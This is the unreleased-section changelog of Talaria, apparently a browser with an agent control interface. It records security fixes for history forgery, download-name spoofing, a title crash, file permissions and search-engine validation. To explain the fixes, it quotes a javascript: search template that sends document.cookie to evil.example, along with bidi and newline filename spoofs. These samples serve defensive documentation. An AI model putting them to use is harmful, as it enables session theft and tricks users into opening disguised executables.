# Changelog

All notable changes to Talaria are recorded here. Format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/); this project has not
cut a release yet, so everything to date sits under Unreleased.

## [Unreleased]

### Fixed

- **An agent can no longer forge rows into the human's browsing history.**
  `tabs_list` hands an agent every tab, including the human's own, and `navigate`
  resolved any tab id without checking who owned it — so an agent could point one
  of the human's tabs at a URL of its choosing and have the completed load
  recorded as a page the human visited. The History panel told the human this was
  impossible. Two layers, because either alone leaves a route open: `navigate` now
  refuses a tab the human owns outright (an agent opens its own tabs with
  `tabs_open`, and `tabs_close`'s deliberate permission to act on a tab it does
  not own is untouched), and the history filter now asks who *caused* a load
  rather than who owns the tab it happened in, so an `evaluate` that navigates by
  assigning `location.href` is skipped too. The mark is cleared as the row is
  skipped, so the human's very next navigation on that tab is recorded normally —
  the failure direction is "miss a row", never "forge one"
  (`crates/talaria-shell/src/app.rs`, `tabs.rs`, `history.rs`, `gui.rs`).
- **A download row now says when an agent asked for it, and its name can no longer
  lie.** The Downloads panel hangs a one-click handoff to the OS's default
  application off every row, and an agent chose both the bytes and the extension
  that decides which application that is — while the row showed nothing to tell it
  apart from a file the human fetched themselves. Worse, the filename was checked
  only for `/` and `..`, so newlines, tabs and Unicode bidi overrides reached the
  label unaltered: `invoice.pdf\n\nSafe — from your bank` rendered as two lines,
  and `report␮fdp.exe` rendered as `report.exe.pdf`. Every completed download is
  still recorded whoever asked for it — that was never the problem — but the row
  now carries the provenance and the panel shows it on the line it already had.
  Those characters are refused at the `download` command boundary, and the panel
  sanitizes as well, for rows an older build already wrote. The path `Open`
  launches is untouched: still exactly what was written to disk
  (`crates/talaria-shell/src/downloads.rs`, `app.rs`, `gui.rs`).
- **A website can no longer crash the browser with its own `<title>`.** Both tab
  strips truncated a page-supplied title with `String::truncate`, which takes a
  *byte* index and panics when it lands inside a multibyte character — a title of
  ten CJK characters is 30 bytes, and byte 28 is mid-character. The panic happened
  on the main thread inside egui's render pass, so it took the whole application
  down: every tab, and every agent session. Both sites now use the
  `truncate_chars` helper the panels already used
  (`crates/talaria-shell/src/gui.rs`).
- **The four plaintext stores are now owner-only.** `history.jsonl`,
  `bookmarks.json`, `config.json` and `downloads.json` were written at `0644` in a
  `0755` directory, so on a shared machine the complete record of every URL the
  user had visited — query strings, and the session tokens and reset links they
  carry, included — was readable by every local account. Two of those modules
  justified storing plaintext on the ground that the file permissions already
  restricted access; nothing set them. All four files now land at `0600` and the
  config directory at `0700`, through a new
  `crates/talaria-shell/src/permissions.rs`. The mode is applied to the staged
  `.tmp` *before* the atomic rename, since a rename carries the staged file's
  mode, and `history.jsonl` — which is append-only and so never recreated — is
  brought down at load, so a log written by an earlier build is repaired rather
  than left open. Unix-only, and a permission that cannot be set is logged and
  the write still happens.
- **`TALARIA_HISTORY_MAX_ENTRIES=0` no longer deletes the entire history at every
  startup.** `"0"` parses successfully, so it was accepted as a real retention cap
  and pruned every row — the exact opposite of what someone reading `0` as "no
  limit" was asking for, unrecoverable, and announced only in a log line. Zero now
  falls back to the default of 5,000 (`crates/talaria-shell/src/history.rs`).
- **A search-engine template must now be an `http`/`https` URL.** Validation
  checked only that `{query}` appeared exactly once, so
  `javascript:fetch('https://evil.example/'+document.cookie)//{query}` and
  `file:///{query}` both saved, persisted across restarts, and became what the
  address bar navigated to for every non-URL thing typed into it. The address bar
  already refused `data:` for this reason; the settings field is the same attack
  with a much longer persistence. The Save gate and the load path share one
  validator, so a hand-edited `config.json` degrades to the default engine rather
  than being honoured for having skipped the button
  (`crates/talaria-shell/src/settings.rs`).
- **The vault can no longer hang startup on a machine with no session D-Bus.**
  `Vault::load()` runs on the main thread and asked the OS keychain for its key
  through `keyring`, which on Linux talks to the Secret Service over D-Bus. With
  no `DBUS_SESSION_BUS_ADDRESS`, libdbus does not fail — it tries to *start* a
  session bus and blocks forever when it cannot, which froze the event loop while
  the control socket kept answering `hello`. The shell looked alive and served
  nothing. Fixed in two layers in `crates/talaria-shell/src/vault.rs`: the
  keychain is skipped outright when no bus can exist, and the lookup is
  time-bounded (1500ms, `TALARIA_KEYCHAIN_TIMEOUT_MS`) when one is merely
  unreachable. Affected every headless server, container, SSH session and CI job.

### Added

- **Local browsing history** (BROWSE-01). Every navigation that completes on a
  human ("Me") tab appends a `(url, title, timestamp)` row to `history.jsonl`
  under the config dir, and a History panel (toolbar button, Ctrl+H) lists them
  newest-first. Agent-owned tabs deliberately do **not** write to the human's
  history — an agent driving a session should not silently populate the user's
  record of where *they* have been.

  An append-only log rather than a whole-file rewrite, because history is the
  one high-churn store here: a rewrite per navigation would grow quadratically
  with the file. The 5,000-entry cap (`TALARIA_HISTORY_MAX_ENTRIES`) is applied
  by pruning at load, which is the only moment the file is rewritten.

  **Known gap, measured rather than assumed:** Servo 0.4.0 does not re-fire
  `LoadStatus::Complete` for a same-document navigation, so a single-page app's
  `pushState` route changes produce no history row. `tests/e2e/history_test.py`
  prints this observation on every run instead of asserting it, so a future
  Servo that changes the behaviour will say so rather than going silently green.

- **Bookmarks** (BROWSE-02). A toolbar star (Ctrl+D) toggles the current page
  bookmarked, and a Bookmarks panel (Ctrl+B) lists them for revisiting.
  `bookmarks.json` is written atomically — staged into a `.tmp` sibling and
  renamed, a sibling because `fs::rename` is only atomic within one filesystem —
  so a process killed mid-save cannot leave a half-written list, and a stale
  `.tmp` is never read back as data.

- **A configurable default search engine** (BROWSE-03). The address bar's
  hardcoded DuckDuckGo fallback is gone: `resolve_location` now takes a
  `&SearchEngine` read from `config.json`, editable from a Settings panel whose
  Save is gated on the URL template containing `{query}` exactly once. A
  malformed or hand-edited config degrades to the default engine rather than
  panicking.

  Deliberately *not* changed: a `data:` URL typed into the human address bar is
  still treated as a search query rather than navigated to. Widening it to match
  the agent path's handling was considered and declined — "the human typed it,
  so trust it" is weakest exactly where the paste-this-into-your-address-bar
  pattern makes the human a courier for someone else's payload. The two trust
  roots differ on purpose.

- **A downloads list** (BROWSE-04). Every download that completes now appends a
  row to `downloads.json`, and a Downloads panel (toolbar `⬇` button, Ctrl+J)
  lists them newest-first with a size, an age, an `Open` button and a
  remove-from-list button. Deliberately records *every* completed download
  regardless of which client asked for it — unlike history, which is Me-only —
  because a file that landed on the user's disk is theirs to see whoever caused
  it. Removing a row never deletes the file.

  Two properties worth stating rather than leaving to be discovered:

  - The stored path is the path that was **actually written**, not the filename
    that was requested. Those differ whenever a name collided and `create_unique`
    uniquified it to `report (1).pdf`, and the stored path is what `Open` hands
    to the OS.
  - `Open` launches `xdg-open` and is therefore the browser's only
    process-spawning surface. It is reachable **only** from the Downloads
    panel's own button. There is no MCP tool, no control-socket command and no
    `talaria-protocol` variant that reaches it — an agent-reachable opener would
    hand back exactly the local-execution surface the agent-surface hardening
    work removed.

  This needed the first `EventLoopProxy` on `Shared`: `download()` runs on a
  background thread, and `Shared` is `Rc`-based and not `Send`, so completion
  travels back as an `AppEvent` applied on the main loop rather than by touching
  the store off-thread.
- `tests/e2e/downloads_list_test.py`, pinning that a real fetch produces a
  correct row, that two same-named downloads get two distinct rows on their two
  distinct paths, and that a refused download produces none.
- **`Event::TabOpened { tab_id, opener_tab_id }`** (AGENT-04). A popup adopted
  into an agent's session — a page it drives calling `window.open` or following a
  `target=_blank` link — is now announced to the owning session instead of being
  discoverable only by polling `tabs_list`. Reaches MCP clients as a
  `notifications/message`, like the existing crash and close events.
- `tests/e2e/vault_nobus_test.py`, pinning the no-bus startup path.
- **A `chrome_rects` test hook, and the panel-click suite it makes possible.**
  The shell can now report the logical rect of each named chrome control — the
  toolbar's buttons and the rows of whichever panel is open — collected from the
  `Response`s the chrome already computes. Gated on `TALARIA_TEST_HOOKS=1`
  exactly as the `evaluate` crash hook is, refused as an unknown command without
  it, and deliberately not an MCP tool: chrome geometry is a map of the human's
  own controls, and an agent that could read it would know where to aim
  synthetic input at the credentials button, the bookmark star or a downloads
  row (`crates/talaria-protocol/src/lib.rs`, `crates/talaria-shell/src/gui.rs`,
  `app.rs`).

  This deletes the hardcoded toolbar coordinate `tests/e2e/vault_ui_test.py`
  carried, which moved four times in one phase and was discovered as a red suite
  every time. It also unblocks `tests/e2e/panel_click_test.py`, which drives the
  six behaviours that previously had no automated coverage: clicking a history
  row and a bookmark row to navigate and close the panel, the two-click Clear
  history confirm *and* its reset when the panel closes, and the Downloads
  panel's `Open` — that it launches at all, that it launches **exactly the path
  the row stores** (proved by downloading the same filename twice and pressing
  Open on the first row, whose path a re-derivation could not produce), and that
  a spawn failure shows a dismissible inline notice instead of taking the
  browser down. `xdg-open` is faked for the run by a script written to a temp
  directory, so the argv assertions are exact and nothing launches a real
  application.

### Changed

- The e2e CI job no longer wraps the suite in `dbus-run-session`. That wrapper
  existed to hide the startup hang above; with the hang fixed at the source,
  running bare is what proves the fallback works.
